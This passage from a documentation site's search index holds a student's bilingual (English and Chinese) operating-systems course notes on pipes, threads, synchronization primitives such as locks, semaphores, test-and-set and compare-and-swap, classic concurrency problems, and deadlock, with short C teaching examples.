</ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#synchronization","title":"Synchronization","text":"","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#pipes","title":"Pipes","text":"<ul> <li>Ordinary pipes \u2013 cannot be accessed from outside the process that created it. Typically, a parent process creates a pipe and uses it to communicate with a child process that it created. </li> <li>Named pipes \u2013 can be accessed without a parent-child relationship.</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#ordinary-pipes","title":"ordinary pipes","text":"","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#named-pips","title":"Named pips","text":"<ul> <li>Named Pipes are more powerful than ordinary pipes</li> <li>Communication is bidirectional</li> <li>No parent-child relationship is necessary between the communicating processes</li> <li>Several processes can use the named pipe for communication</li> <li>Provided on both UNIX and Windows systems</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#unix-pipes","title":"Unix pipes","text":"<ul> <li>In UNIX, a pipe is mono-directional<ul> <li>Two pipes must be used for bi-directional communication</li> </ul> </li> <li>One talks of the write-end and the read-end of a pipe</li> <li>The \u201cpipe\u201d command-line feature, \u2018|\u2019, corresponds to a pipe</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#threads","title":"Threads","text":"<ul> <li>A thread is a basic unit of execution within a process</li> <li>Each thread has its own<ul> <li>Thread ID</li> <li>Program counter</li> <li>Register set</li> <li>Stack</li> </ul> </li> <li>It shares the following with other threads within the same process <ul> <li>Code section</li> <li>Data section</li> <li>Heap (dynamically allocated memory)</li> <li>Open files and signals</li> </ul> </li> <li>Concurrency: A multi-threaded process can do multiple things at once</li> </ul> <p>Single-threaded vs. Multithreaded</p> <p></p> <p>Question</p> <p>\u5728 multihreaded process \u4e2d\uff0c\u67d0\u4e00\u7ebf\u7a0b\u80fd\u5426\u8bbf\u95ee\u5176\u4ed6\u7ebf\u7a0b\u7684\u6808\uff1f</p> <p>\u4e00\u822c\u4e0d\u4f1a\uff0c\u4f46\u662f\u4e0d\u963b\u6b62\u3002</p>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#advantages","title":"Advantages","text":"<ul> <li>Economy: <ul> <li>Creating a thread is cheap<ul> <li>Code, data and heap are already in memory</li> </ul> </li> <li>Context-switching between threads is cheap</li> </ul> </li> <li>Resource Sharing:<ul> <li>Threads naturally share memory<ul> <li>Having concurrent activities in the same address space is very powerful</li> </ul> </li> <li>But fraught with danger</li> </ul> </li> <li>Responsiveness:<ul> <li>A program that has concurrent activities is more responsive</li> <li>This is true of processes as well, but with threads we have better sharing and economy</li> </ul> </li> <li>Scalability:<ul> <li>Running multiple \u201cthreads\u201d at once uses the machine more effectively</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#drawbacks","title":"Drawbacks","text":"<ul> <li>Weak isolation between threads: <ul> <li>If one thread fails (e.g., a segfault), then the process fails.</li> </ul> </li> <li>Threads may be more memory-constrained than processes<ul> <li>Due to OS limitation of the address space size of a single process</li> </ul> </li> <li>Threads do not benefit from memory protection<ul> <li>Concurrent programming with Threads is hard</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#multi-threading-challenges","title":"Multi-Threading Challenges","text":"<ul> <li>Deal with data dependency and synchronization</li> <li>Dividing activities among threads</li> <li>Balancing load among threads</li> <li>Split data among threads</li> <li>Testing and debugging</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#user-threads-vs-kernel-threads","title":"User Threads vs. Kernel Threads","text":"","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#many-to-one-model","title":"Many-to-One Model","text":"<ul> <li>Advantage: multi-threading is efficient and low-overhead<ul> <li>No syscalls to the kernel</li> </ul> </li> <li>Drawback:<ul> <li>cannot take advantage of a multi-core architecture!</li> <li>if one threads blocks, then all the others do!</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#one-to-one-model-used-on-linux-windows-and-so-on","title":"One-to-One Model (used on linux, windows and so on)","text":"<ul> <li>Advantage: Removes both drawbacks of the Many-to-One Model<ul> <li>Creating a new threads requires work by the kernel</li> </ul> </li> <li>Drawback: Not as fast as in the Many-to-One Model; expensive</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#many-to-many-model-two-level-model","title":"Many-to-Many Model &amp; Two-Level Model","text":"<p>difficult to shedule</p>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#thread-libraries","title":"Thread Libraries","text":"<p>Thread libraries provide users with ways to create threads in their own programs.</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#pthreads","title":"Pthreads:","text":"<ul> <li>May be provided either as user-level or kernel-level</li> <li>A POSIX standard (IEEE 1003.1c) API for thread creation and synchronization</li> <li>Specification, not implementation</li> <li>API specifies behavior of the thread library, implementation is up to development of the library</li> <li>Common in UNIX operating systems (Linux &amp; Mac OS X)</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#openmp","title":"OpenMP","text":"<ul> <li>Set of compiler directives and an API for C, C++, FORTRAN </li> <li>Provides support for parallel programming in shared-memory environments</li> <li>Identifies parallel regions \u2013 blocks of code that can run in parallel</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#threading-issues","title":"Threading Issues","text":"","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#semantics-of-fork-and-exec","title":"Semantics of fork() and exec()","text":"","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#signals","title":"Signals","text":"<ul> <li>We\u2019ve talked about signals for processes<ul> <li>Signal handlers are either default or user-specified</li> <li>signal() and kill() are the system calls</li> </ul> </li> <li>In a multi-threaded program, what happens? Multiple options<ul> <li> Deliver the signal to the thread to which the signal applies</li> <li> Deliver the signal to every thread in the process</li> <li> Deliver the signal to certain threads in the process</li> <li> Assign a specific thread to receive all signals</li> </ul> </li> <li>Most UNIX versions: a thread can say which signals it accepts, and which signals it doesn\u2019t accept</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#safe-thread-cancellation","title":"Safe Thread Cancellation","text":"<p>One potentially useful feature would be for a thread to simply  terminate another thread. Two possible approaches: - Asynchronous cancellation     - One thread terminates another immediately - Deferred cancellation     - A thread periodically checks whether it should terminate</p>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#linux-threads","title":"Linux threads","text":"<p>Linux does not distinguish between PCB and TCB (Kernel data structure: task_struct).</p> <p>In Linux, a thread is also called a light-weight process (LWP)</p> <p>The clone() syscall is used to create a thread or a process - Shares execution context with its parent - pthread library uses clone() to implement threads</p> <p>Single-threaded process vs. multi-threaded process</p> <p></p> <p>What's shared for Threads within Process ?</p> <p></p>","tags":["notes"]},{"location":"note/CSys-II/5_IPC/#user-thread-to-kernel-thread-mapping","title":"User thread to kernel thread mapping","text":"<p>\u6574\u4e2a\u8fdb\u7a0b\u53ea\u9700\u8981\u4e00\u4e2a control block\uff0c\u4e14\u653e\u5728 kernel space \u4e2d\uff1b\u8fdb\u7a0b\u53ef\u4ee5\u662f\u591a\u7ebf\u7a0b\u7684\u3002</p> <p>Summary</p> <ul> <li>Same task_struct (PCB) means same thread<ul> <li>Also viewed as 1:1 mapping; One user thread maps to one kernel thread</li> <li>But actually, they are the same thread</li> </ul> </li> <li>Can be executed in user space<ul> <li>User code, user space stack</li> </ul> </li> <li>Can be executed in kernel space<ul> <li>Kernel code, kernel space stack</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/","title":"6 Synchronization","text":"","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#intro","title":"Intro","text":"example.c<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;pthread.h&gt;\n\nint counter = 0;\nstatic int loops = 1e7;\n// pthread_mutex_t pmutex = PTHREAD_MUTEX_INITIALIZER;\n\nvoid* worker(void* arg) {\n    int i;\n    printf(\"%s: begin\\n\", (char*)arg);\n    for (i = 0; i &lt; loops; i++) {\n        // pthread_mutex_lock(&amp;pmutex);\n        counter++;\n        // pthread_mutex_unlock(&amp;pmutex);\n    }\n    printf(\"%s: done\\n\", (char*)arg);\n    return NULL;\n}\n\nint main() {\n    pthread_t p1, p2;\n\n    printf(\"main: begin (counter = %d)\\n\", counter);\n    pthread_create(&amp;p1, NULL, worker, \"A\");\n    pthread_create(&amp;p2, NULL, worker, \"B\");\n    pthread_join(p1, NULL);\n    pthread_join(p2, NULL);\n    printf(\"main: done with both (counter = %d)\\n\", counter);\n    return 0;\n}\n</code></pre> <p>\u5728\u6211\u4eec\u7684\u9884\u671f\u4e2d\uff0c\u4e0a\u9762\u7684\u7a0b\u5e8f\u5e94\u5f53\u662f\u4e24\u4e2a\u7ebf\u7a0b p1 p2 \u4e00\u8d77\u6570\u6570\uff0c\u6bcf\u4e2a\u4eba\u6570 1e6 \u6b21\uff0c\u5171 2e6 \u6b21\uff1b\u4f46\u662f\u5b9e\u9645\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>$ gcc example.c -o tmpC &amp;&amp; ./tmpC\nmain: begin (counter = 0)\nA: begin\nB: begin\nB: done\nA: done\nmain: done with both (counter = 1034720)\n</code></pre> <p><code>counter++;</code> \u662f\u4e00\u6761 C \u8bed\u8a00\u8bed\u53e5\uff0c\u4f46\u662f\u9700\u8981\u591a\u6761\u6c47\u7f16\u6307\u4ee4\uff08\u53d6\u51b3\u4e8e ISA\uff09\uff1b\u5982\u679c p1 \u6267\u884c\u67d0\u6761\u6307\u4ee4\u65f6\uff0c\u88ab interrupt \u6216\u8005 p2 \u8bfb\u53d6\u4e86 counter \u7684\u503c\uff08\u6b64\u65f6 p1 \u8fd8\u6ca1\u6709\u5c06\u8ba1\u7b97\u7684\u7ed3\u679c\u5199\u56de\uff09\uff1b\u90a3\u4e48\u4e0d\u77e5\u4e0d\u89c9\u4e2d\uff0c\u6570\u7684\u6b21\u6570\u5c31\u504f\u5c11\u4e86\uff0c\u8fd9\u79f0\u4e3a Race Condition\u3002</p> <p>Race Condition</p> <p>Several processes (or threads) access and manipulate the same data concurrently and the outcome of the execution depends on the particular order in which the access takes place, is called a race-condition.</p> <p>\u4e3a\u6b64\uff0c\u5f15\u5165 critical section\u3002</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#critical-section","title":"Critical section","text":"","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#problem","title":"Problem","text":"<p>Each process has a critical section segment of code (E.g., to change common variables, update table, write file, etc.)</p> general structure of a progress<pre><code>// An example is presented in the comments to the code above\nwhile (true) {\n    // entry section\n    /* critical section */\n    // exit section\n    /* remainder section */\n}\n</code></pre> <ul> <li>Only one process can be in the critical section</li> <li>Each process must ask permission to enter critical section in entry section</li> <li>The permission should be released in exit section</li> <li>The remaining code is the remainder section</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#solution","title":"solution","text":"<p>What about Preventing interrupts? - Single-core system: works well - Multiple-processor system: not feasible</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#three-requirements-for-solutions","title":"Three Requirements for Solutions","text":"<ol> <li>Mutual Exclusion<ul> <li>Only one process can execute in the critical section.</li> </ul> </li> <li>Progress<ul> <li>No deadlock (there must a progress in critical section unless no progress wish to enter its critical section).</li> </ul> </li> <li>Bounded waiting<ul> <li>No starvation (every progress has chance to  enter its critical section).</li> </ul> </li> </ol>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#petersons-solution","title":"Peterson's solution","text":"<p>Peterson\u2019s solution solves two-processes synchronization, and only works for two processes case.</p> <p>It assumes that LOAD and STORE are atomic (execution can't be interrupted, but it usually can't be guaranteed by hardware automatically).</p> <p>So the two processes share two variables: - boolean flag[2]: whether a process is ready to enter the critical section - int turn: whose turn it is to enter the critical section</p> <p></p> <p>We can prove that Peterson's solution satisfies the three requirements of the solution.</p> <p>Extra</p> <p>Although useful for demonstrating an algorithm, Peterson\u2019s solution is not guaranteed to work on modern architectures. (Since it requires too much, sometimes be wrong and works only for two.)</p> <p>https://www.cs.cornell.edu/courses/cs414/2007sp/homework/hw2_soln.pdf </p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#hardware-support-for-synchronization","title":"Hardware Support for synchronization","text":"<p>Uniprocessors: disable interrupts</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#memory-barriers-memory-fences","title":"Memory barriers (memory fences)","text":"<p>Memory models are the memory guarantees a computer architecture makes to application programs. They are either Strongly ordered or Weakly ordered.</p> <p>A memory barrier is an instruction that forces any change in memory to be propagated (made visible) to all other processors. </p> <p>Four basic varieties of memory barriers in linux: - Write (or store) memory barriers - Address-dependency barriers (historical) - Read (or load) memory barriers - General memory barriers - Implicit varieties:     - ACQUIRE operations     - RELEASE operations</p> <p>Explicit/Implicit Memory Barriers in Linux: TODO, may be not important.</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#hardware-instructions","title":"Hardware Instructions","text":"<p>Special hardware instructions that allow us to either test-and modify the contentof a word, or to swap the contents of two words atomically (uninterruptable)</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#test_and_set-tas","title":"test_and_set (TAS)","text":"tas.c<pre><code>// The function is atomically; it is just one instruction\nbool test_and_set(bool* target) { // passed parameter (pp)\n    bool rv = *target;\n    *target = true; // set the new value of pp to true\n    return rv; // return the original value of pp, ensure if target is used, another thread can jump out `while();` that is, another thread is busying waiting.\n}\n\nvoid use_lock() {\n    bool lock = true;\n    do {\n        while (test_and_set(&amp;lock)); // get lock if lock is not used; else do nothing\n        /* critical section */\n        lock = false; // release lock\n        /* remainder section */\n    } while (true);\n}\n</code></pre>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#compare_and_swap-cas","title":"compare_and_swap (CAS)","text":"cas.c<pre><code>// The function is atomically\nint compare_and_swap(int* value, int expected, int new_value) {\n    int temp = *value;\n    if (*value == expected) // swap happens only under this condition\n        *value = new_value;\n    return temp; // return the original value of passed *value\n}\n\nvoid use_lock() {\n    int lock = 0;\n    while (true) {\n        while (compare_and_swap(&amp;lock, 0, 1) == 0); // get lock if lock is not used; else do nothing\n        /* critical section */\n        lock = 0;\n        /* remainder section */\n    }\n}\n</code></pre> <p>in practice: - x86     - <code>lock cmpxchg &lt;destination operand&gt;, &lt;source operand&gt;</code> - arm     - <code>LDREX</code> and <code>STREX</code> instructions used together     - to implement atomic operations the programmer must retry the operation (both LDREX and STREX) until the exclusive monitor signals a success.</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#atomic-variables","title":"Atomic Variables","text":"<p>One tool is an atomic variable that provides atomic (uninterruptible) updates on basic data types such as integers and booleans. - For example, the increment() operation on the atomic variable sequence ensures sequence is incremented without interruption: <code>increment(&amp;sequence);</code>;</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#mutex-lock-spinlock","title":"Mutex Lock (spinlock)","text":"<p>Mutex locks protect a critical section by first <code>acquire()</code> a lock then <code>release()</code> the lock; calls to <code>acquire()</code> and <code>release()</code> must be atomic. These two functions can be implement using test_and_set or compare_and_swap.</p> mutexLock/spinLock.c<pre><code>static bool available = false;\nvoid acquire() {\n    while (!available); // busy wait\n    available = false;\n}\nvoid release() {\n    available = true;\n}\n\nwhile (true) {\n    acquire lock\n    critical section\n    release lock\n    remainder section\n}\n</code></pre> <p>busy waiting</p> <p>In computer science and software engineering, busy-waiting, busy-looping or spinning is a technique in which a process repeatedly checks to see if a condition is true, such as whether keyboard input or a lock is available. Spinning can also be used to generate an arbitrary time delay, a technique that was necessary on systems that lacked a method of waiting a specific length of time. Processor speeds vary greatly from computer to computer, especially as some processors are designed to dynamically adjust speed based on current workload.[1] Consequently, spinning as a time-delay technique can produce inconsistent or even unpredictable results on different systems unless code is included to determine the time a processor takes to execute a \"do nothing\" loop, or the looping code explicitly checks a real-time clock.</p> <p>This solution requires busy waiting; so called a spinlock . In certain circumstances on multicore systems, spinlocks are in fact the preferable choice for locking.</p> <p>What if we have N threads? - N-1 threads loops in all their CPU time - A huge waste of CPU time and power</p> <p>To avoid wasting, it can just yield:</p> yield_CPU.c<pre><code>bool flag = 0;\nvoid lock() {\n    while (test_and_set(&amp;flag, 1) == 1)\n        yield(); // give up the cpu\n}\nvoid unlock() {\n    flag = 0;\n}\n</code></pre>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#semaphore","title":"Semaphore","text":"semaphore_simple.c<pre><code>void wait(S) {\n    while (S &lt;= 0); // busy wait\n    S--;\n}\nvoid signal(S) {\n    S++;\n}\n</code></pre> <ul> <li>semaphore stands for how many resources we can use.</li> <li>Counting semaphore \u2013 integer value can range over an unrestricted domain</li> <li>Binary semaphore \u2013 integer value can range only between 0 and 1<ul> <li>Same as a mutex lock</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#semaphore-w-waiting-queue","title":"Semaphore w/ waiting queue:","text":"<p><code>w/</code> \u662f <code>with</code> \u7684\u610f\u601d</p> semaphore_wq.c<pre><code>typedef struct {\n    int value;\n    struct list_head* wating_queue;\n} semaphore;\n\nvoid wait(semaphore* s) {\n    s-&gt;value--;\n    if (s-&gt;value &lt; 0) {\n        // add this process to s-&gt;waiting_queue\n        block(); //place the process invoking the operation on the appropriate waiting queue\n    }\n};\nvoid signal(semaphore* s) {\n    s-&gt;value++;\n    if (s-&gt;value &lt;= 0) {\n        // reomve a process P from s-&gt;waiting_queue\n        wakeup(P); // remove one of processes in the waiting queue and place it in the ready queue\n    }\n}\n</code></pre> <p>Busy waiting changes:</p> <p></p> semaphore_wq in practice<pre><code>typedef struct __lock_t {\n    int flag;  // 0 means not locked\n    int guard; // 0 means not available to flag\n    queue_t* q;\n} lock_t;\n\nvoid lock_init(lock_t* m) {\n    m-&gt;flag = 0;\n    m-&gt;guard = 0;\n    queue_init(m-&gt;q);\n}\n\nvoid lock(lock_t* m) {\n    while (test_and_set(&amp;m-&gt;guard, 1) == 1)\n        ; //acquire guard lock by spinning\n    if (m-&gt;flag == 0) {\n        m-&gt;flag = 1; //lock is acquired\n        m-&gt;guard = 0;\n    } else {\n        queue_add(m-&gt;q, gettid());\n        m-&gt;guard = 0; // \n        park(); // release the processor\n    }\n}\n\nvoid unlock(lock_t* m) {\n    while (test_and_set(&amp;m-&gt;guard, 1) == 1)\n        ; //acquire guard lock by spinning\n    if (queue_empty(m-&gt;q))\n        m-&gt;flag = 0;\n    else\n        wakeup(queue_remove(m-&gt;q));\n    m-&gt;guard = 0;\n}\n</code></pre> <ul> <li>m-&gt;guard \u7684\u4f5c\u7528\u662f\uff1a\u4fdd\u62a4 m-&gt;flag</li> <li>14-15 \u884c\u7684\u5b9e\u73b0\u4e86\uff1aspinLock</li> <li>\u4e3a\u4ec0\u4e48\u4e0d\u80fd\u591f\u4e92\u6362 21/22 \u884c\uff1a\u6267\u884c\u5230 21/22 \u884c\u65f6\uff0c\u8bf4\u660e guard = 1\uff1b\u4e92\u6362\u540e\u6267\u884c\u5230 <code>park()</code> \u65f6\uff0c\u8be5\u7ebf\u7a0b\u5c06 \u201c\u62ff\u7740 lock \u53bb sleep\u201d\uff1bm-&gt;guard \u6c38\u8fdc\u4e3a 1\uff0c\u5176\u4ed6\u7ebf\u7a0b\u4e00\u65e6\u8fdb\u5165 <code>lock()</code> \u5c31\u65e0\u6cd5\u8df3\u51fa 14 \u884c\u5faa\u73af\u3002\uff08\u8bfe\u4e0a\u8bb0\u7684\uff0c\u597d\u50cf\u6709\u70b9\u95ee\u9898\uff1f\uff09</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#mutex-vs-semaphore","title":"mutex vs. semaphore","text":"<ul> <li>mutex(spinLock)<ul> <li>pros: no blocking</li> <li>cons: waste CPU time on looping</li> <li>Good for short critical section.</li> </ul> </li> <li>semaphore<ul> <li>pros: no looping</li> <li>cons: context switch is time-consuming</li> <li>Good for long cirtical section</li> </ul> </li> </ul> <p>\u957f\u548c\u77ed\u662f\u76f8\u5bf9 context switch \u7684\u957f\u5ea6\u800c\u8a00\u7684\u3002</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#deadlock-and-starvation","title":"deadlock and starvation","text":"<ul> <li>Deadlock: two or more processes are waiting indefinitely for an event that can be caused by only one of the waiting processes</li> <li>Starvation: indefinite blocking; a process may never be removed from the semaphore\u2019s waiting queue</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#priority-inversion","title":"Priority Inversion","text":"<p>a higher priority process is indirectly preempted by a lower priority task.</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#example","title":"example","text":"<ul> <li>three processes, PL, PM, and PH with priority PL &lt; PM &lt; PH</li> <li>PL holds a lock that was requested by PH \u27b1 PH is blocked</li> <li>PM becomes ready and preempted the PL</li> <li>It effectively \"inverts\" the relative priorities of PM and PH</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#solution_1","title":"solution","text":"<p>priority inheritance: temporary assign the highest priority of waiting process (PH) to the process holding the lock (PL)</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#reader-writer-block-todo","title":"reader-writer block (todo)","text":"","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#examples","title":"Examples","text":"","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#bounded-buffer-problem","title":"Bounded-Buffer Problem","text":"","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#description","title":"description","text":"<ul> <li>Two processes, the producer and the consumer share n buffers<ul> <li>the producer generates data, puts it into the buffer</li> <li>the consumer consumes data by removing it from the buffer</li> </ul> </li> <li>The problem is to make sure:<ul> <li>the producer won\u2019t try to add data into the buffer if it is full</li> <li>the consumer won\u2019t try to remove data from an empty buffer</li> </ul> </li> <li>aka producer-consumer problem</li> </ul>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#solution_2","title":"solution","text":"<ul> <li>n buffers, each can hold one item</li> <li>semaphore mutex initialized to the value 1</li> <li>semaphore full-slots initialized to the value 0</li> <li>semaphore empty-slots initialized to the value N</li> </ul> solution.c<pre><code>/* The producer process: */\ndo {\n    //produce an item\n    \u2026\n    wait(empty-slots);\n    wait(mutex);\n    //add the item to the buffer\n    \u2026\n    signal(mutex);\n    signal(full-slots);\n} while (TRUE)\n\n/* The consumer process: */\ndo {\n    wait(full-slots);\n    wait(mutex);\n    //remove an item from buffer\n    \u2026\n    signal(mutex);\n    signal(empty-slots);\n    //consume the item\n    \u2026\n} while (TRUE);\n</code></pre>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#readers-writers-problem","title":"Readers-Writers Problem","text":"","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#description_1","title":"description","text":"<p>\u2022 A data set is shared among a number of concurrent processes     \u2022 readers: only read the data set; they do not perform any updates     \u2022 writers: can both read and write \u2022 The readers-writers problem:     \u2022 allow multiple readers to read at the same time (shared access)     \u2022 only one single writer can access the shared data (exclusive access)</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#solution_3","title":"solution","text":"<p>\u2022 semaphore mutex initialized to 1 \u2022 semaphore write initialized to 1 \u2022 integer readcount initialized to 0</p> solution.c<pre><code>/* The writer process */\ndo {\n    wait(write);\n    //write the shared data\n    \u2026\n    signal(write);\n} while (TRUE);\n\n/* The structure of a reader process */\ndo {\n    wait(mutex);\n    readcount++;\n    if (readcount == 1) //first reader\n        wait(write);    //block write\n    signal(mutex)\n    //reading data\n    \u2026\n    wait(mutex);\n    readcount--;\n    if (readcount == 0)\n        signal(write);\n    signal(mutex);\n} while (TRUE);\n</code></pre>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#dining-philosophers-problem-to-learn","title":"Dining-Philosophers Problem (to learn)","text":"","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#description_2","title":"description","text":"<ul> <li>Philosophers spend their lives thinking and eating<ul> <li>They sit in a round table, but don\u2019t interact with each other</li> </ul> </li> <li>They occasionally try to pick up 2 chopsticks (one at a time) to eat<ul> <li>One chopstick between each adjacent two philosophers</li> <li>Need both chopsticks to eat, then release both when done</li> </ul> </li> <li>Dining-philosopher problem represents multi-resource synchronization  </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#solution_4","title":"solution","text":"<p>Semaphore chopstick[5] initialized to 1.</p> <p>For more exercise: https://www.cs.cornell.edu/courses/cs414/2007sp/homework/hw2_soln.pdf</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#linux-synchronization-todo","title":"Linux Synchronization (Todo)","text":"","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#deadlock","title":"Deadlock","text":"","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#deadlock-problem","title":"Deadlock problem","text":"<p>Deadlock</p> <p>a set of blocked processes each holding a resource and waiting to acquire a resource held by another process in the set</p> <p>deadlock_cs</p> <p>In concurrent computing, deadlock is any situation in which no member of some group of entities can proceed because each waits for another member, including itself, to take action, such as sending a message or, more commonly, releasing a lock.</p> deadLock.c<pre><code>pthread_mutex_t first_mutex;\npthread_mutex_t second_mutex;\nvoid deadLock_init() {\n\n    pthread_mutex_init(&amp;first_mutex, NULL);\n    pthread_mutex_init(&amp;second_mutex, NULL);\n}\n\nvoid* do_work_one() {\n    pthread_mutex_lock(&amp;first_mutex);\n    pthread_mutex_lock(&amp;second_mutex);\n    // do work\n    pthread_mutex_unlock(&amp;second_mutex);\n    pthread_mutex_unlock(&amp;first_mutex);\n    pthread_exit(0);\n}\n\nvoid* do_work_two() {\n    pthread_mutex_lock(&amp;second_mutex);\n    pthread_mutex_lock(&amp;first_mutex);\n    // do work\n    pthread_mutex_unlock(&amp;first_mutex);\n    pthread_mutex_unlock(&amp;second_mutex);\n    pthread_exit(0);\n}\n</code></pre> <p></p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#system-model","title":"System model","text":"","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#resource-allocation-graph","title":"Resource-Allocation Graph","text":"<ul> <li>Two types of nodes:<ul> <li>P = {P1, P2, \u2026, Pn}, the set of all the processes in the system</li> <li>R = {R1, R2, \u2026, Rm}, the set of all resource types in the system</li> </ul> </li> <li>Two types of edges:<ul> <li>Request edge: directed edge Pi \u279e Rj<ul> <li>Pi has requested an instance of resource type Rj and is currently waiting for that resource.</li> </ul> </li> <li>Assignment edge: directed edge Rj \u279e Pi<ul> <li>An instance of resource type Rj has been allocated to thread Pi</li> </ul> </li> </ul> </li> <li>legend </li> </ul> <p>Example</p> <ul> <li> <p>dead Lock </p> </li> <li> <p>no dead Lock </p> </li> </ul> <p>Help</p> <p>\u4e00\u4e2a resource \u53ea\u8981\u6709\u4e00\u4e2a instance \u662f\u7a7a\u95f2\u7684\uff0c\u5c31\u53ef\u4ee5\u88ab\u5206\u914d\u3002</p> <p>Summary</p> <ul> <li> <p>If graph contains no cycles \u27a0 no deadlock</p> </li> <li> <p>If graph contains a cycle </p> <ul> <li>If only one instance per resource type \u27a0 deadlock</li> <li>If several instances per resource type \u27a0 possibility of deadlock</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#four-conditions-of-deadlock","title":"Four Conditions of Deadlock","text":"<ul> <li>Mutual exclusion: only one process at a time can use a resource</li> <li>Hold and wait: a process holding at least one resource is waiting to acquire additional resources held by other processes</li> <li>No preemption: a resource can be released only voluntarily by the process holding it, after it has completed its task</li> <li>Circular wait: there exists a set of waiting processes {P0, P1, \u2026, Pn}<ul> <li>P0 is waiting for a resource that is held by P1</li> <li>P1 is waiting for a resource that is held by P2 \u2026 </li> <li>Pn\u20131 is waiting for a resource that is held by Pn</li> <li>Pn is waiting for a resource that is held by P0</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#handling-deadlocks","title":"Handling deadlocks","text":"","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#deadlock-prevention","title":"Deadlock prevention","text":"<ul> <li>How to prevent mutual exclusion<ul> <li>Not required for sharable resources</li> <li>Must hold for non-sharable resources</li> <li>In general, however, we cannot prevent deadlocks by denying the mutual-exclusion condition, because some resources are intrinsically non-sharable. </li> </ul> </li> <li>How to prevent hold and wait<ul> <li>Whenever a process requests a resource, it doesn\u2019t hold any other resources<ul> <li>Require process to request all its resources before it begins execution</li> <li>Allow process to request resources only when the process has none</li> </ul> </li> <li>Low resource utilization; starvation possible </li> </ul> </li> <li>How to handle no preemption<ul> <li>If a process requests a resource not available<ul> <li>All resources the process is currently holding are preempted (Preempted resources are added to the list of resources it waits for)</li> <li>Process will be restarted only when it can get all waiting resources</li> </ul> </li> </ul> </li> <li>How to handle circular wait<ul> <li>Impose a total ordering of all resource types (Require that each process requests resources in an increasing order)</li> <li>Many operating systems adopt this strategy for some locks.</li> <li>But fail to handle dynamic acquired lock.</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#deadlock-avoidance","title":"Deadlock avoidance","text":"<p>Deadlock avoidance: require extra information about how resources are to be requested. (not practical)</p> <p>Resource-allocation state:  - The number of available and allocated resources - The maximum demands of the processes</p>","tags":["notes"]},{"location":"note/CSys-II/6_Synchronization/#safe-state","title":"safe state","text":"<ul> <li>There exists a sequence  of all processes in the system <li>For each Pi, resources that Pi can still request can be satisfied by currently available resources + resources held by all the Pj (j &lt; i)</li> <li>Safe state can guarantee no deadlock </li> <p>Example</p> <ul> <li>\u4e0b\u56fe\u7684\u4e0a\u534a\u90e8\u5206\u7684\u60c5\u51b5\u662f safe \u7684\uff0c\u56e0\u4e3a Available 